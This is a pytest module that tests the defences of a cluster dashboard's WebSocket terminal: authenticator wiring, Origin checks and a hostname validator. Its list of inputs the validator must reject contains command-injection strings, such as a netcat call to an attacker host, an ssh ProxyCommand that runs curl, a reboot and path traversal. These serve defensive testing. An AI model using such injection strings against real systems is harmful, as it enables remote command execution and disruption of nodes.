# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: LicenseRef-NvidiaProprietary
#
# NVIDIA CORPORATION, its affiliates and licensors retain all intellectual
# property and proprietary rights in and to this material, related
# documentation and any modifications thereto. Any use, reproduction,
# disclosure or distribution of this material and related documentation
# without an express license agreement from NVIDIA CORPORATION or
# its affiliates is strictly prohibited.
# Author: Rafael M. Koike & Cursor Agent ("Ada")
"""The three controls guarding the WebSocket terminal, below Flask's router.

``test_ws_terminal_auth.py`` asserts the end-to-end property: an unauthenticated upgrade must not
create a PTY session. This module tests the mechanisms that property rests on, each of which can
break without the end-to-end test noticing:

* the **authenticator wire**. Evaluating a signed session cookie needs the Flask app, but neither
  ``web_auth`` nor anything under ``api/`` may import ``app``, so ``app.py`` registers its
  implementation. If that registration were dropped nothing would raise -- and unlike the
  materialize hook it would fail *closed*, so the symptom is a terminal nobody can open rather
  than one anybody can. Still silent, still worth a test that only asserts the wire exists.
* the **Origin policy**, which is what stops a page the operator merely visits from opening a
  terminal in their name.
* the **hostname predicate**, which is what stops an operator-supplied target from becoming a
  command on the head node.
"""
from __future__ import annotations

import app as app_module
import pytest
import web_auth
from core import is_valid_node_hostname

# --- The authenticator wire -------------------------------------------------------------------


def test_app_registers_its_wsgi_authenticator():
    assert web_auth._wsgi_authenticator is app_module._wsgi_environ_authenticated


def test_missing_authenticator_denies_rather_than_falls_open(monkeypatch):
    """Fail closed. The alternative is an anonymous PTY plus ssh with the cluster key."""
    previous = web_auth._wsgi_authenticator
    try:
        web_auth.set_wsgi_authenticator(None)
        assert web_auth.wsgi_environ_authenticated({}) is False
    finally:
        web_auth.set_wsgi_authenticator(previous)


def test_a_raising_authenticator_denies(monkeypatch):
    """A malformed environ must not become an accidental bypass via an escaping exception."""
    previous = web_auth._wsgi_authenticator
    try:
        web_auth.set_wsgi_authenticator(lambda environ: (_ for _ in ()).throw(RuntimeError("boom")))
        assert web_auth.wsgi_environ_authenticated({}) is False
    finally:
        web_auth.set_wsgi_authenticator(previous)


# --- The Origin policy ------------------------------------------------------------------------


def _environ(origin: str | None = None, host: str = "localhost:5156") -> dict:
    env = {"HTTP_HOST": host, "wsgi.url_scheme": "http"}
    if origin is not None:
        env["HTTP_ORIGIN"] = origin
    return env


def test_same_origin_is_allowed():
    assert web_auth.wsgi_origin_allowed(_environ("http://localhost:5156")) is True


def test_absent_origin_is_allowed():
    """A non-browser client sends none; it still has to authenticate."""
    assert web_auth.wsgi_origin_allowed(_environ(None)) is True


def test_a_different_port_on_the_same_host_is_refused():
    """The case that matters most, and the one TLS cannot help with.

    Cookies are not port-scoped, so anything else served from ``localhost`` shares the dashboard's
    cookie jar and ``SameSite=Lax`` does not separate them. Comparing host *and port* is what
    catches it.
    """
    assert web_auth.wsgi_origin_allowed(_environ("http://localhost:9999")) is False


def test_a_foreign_origin_is_refused():
    assert web_auth.wsgi_origin_allowed(_environ("https://evil.example")) is False


def test_scheme_is_deliberately_not_compared():
    """An https page reaching an http-declared origin on the same host:port stays allowed.

    Comparing schemes would break the plain-HTTP-to-HTTPS transition and any deployment where a
    proxy terminates TLS, for no gain: a same-host origin on another scheme is not a boundary
    cookies respect anyway.
    """
    assert web_auth.wsgi_origin_allowed(_environ("https://localhost:5156")) is True


def test_configured_origins_are_honoured(monkeypatch):
    monkeypatch.setenv("RACK_WEB_ALLOWED_ORIGINS", "https://nvis.example:8443, https://other.example")
    assert web_auth.wsgi_origin_allowed(_environ("https://nvis.example:8443")) is True
    assert web_auth.wsgi_origin_allowed(_environ("https://other.example")) is True
    assert web_auth.wsgi_origin_allowed(_environ("https://not-listed.example")) is False


def test_a_request_without_a_host_refuses_a_stated_origin():
    """Nothing to compare against, and a caller that supplied Origin is a browser."""
    assert web_auth.wsgi_origin_allowed({"HTTP_ORIGIN": "http://localhost:5156"}) is False


# --- The hostname predicate -------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        "node01",
        "bos01-a05-11-s1-dgx-01-c01",
        "ink50-dh01-h15-15",
        "bos01-a05-11-s1-dgx-01-c01.cm.cluster",
        "10.29.137.4",
    ],
)
def test_real_node_names_are_accepted(name):
    """Regression guard against over-tightening: these are live names from four clusters."""
    assert is_valid_node_hostname(name) is True


@pytest.mark.parametrize(
    "name",
    [
        "node01;id>/tmp/pwned",
        "node01 && reboot",
        "node01|nc attacker 4444",
        "node01`id`",
        "node01$(id)",
        "node01\nreboot",
        "node01'",
        'node01"',
        "node01 -oProxyCommand=/bin/sh",
        "-oProxyCommand=curl attacker",  # an ssh OPTION, not a host, with no metacharacter at all
        "--",
        "root@node01",  # would collapse the user@host the caller builds
        "node01:22",
        "../../etc/passwd",
        "node01.",  # trailing dot leaves an empty label
        "-node01",
        "node01-",
        "",
        "   ",
        None,
    ],
)
def test_injection_shapes_are_rejected(name):
    assert is_valid_node_hostname(name) is False


def test_an_over_long_name_is_rejected():
    assert is_valid_node_hostname("a" * 254) is False


def test_an_over_long_label_is_rejected():
    assert is_valid_node_hostname("a" * 64 + ".example") is False
